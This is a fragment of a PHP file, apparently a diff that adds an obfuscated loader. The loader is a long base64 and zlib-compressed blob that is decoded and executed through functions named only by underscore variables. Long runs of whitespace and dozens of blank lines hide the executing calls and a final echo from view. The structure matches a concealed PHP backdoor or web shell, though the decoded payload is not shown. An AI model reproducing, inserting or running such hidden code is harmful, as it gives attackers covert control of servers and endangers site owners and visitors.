$___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
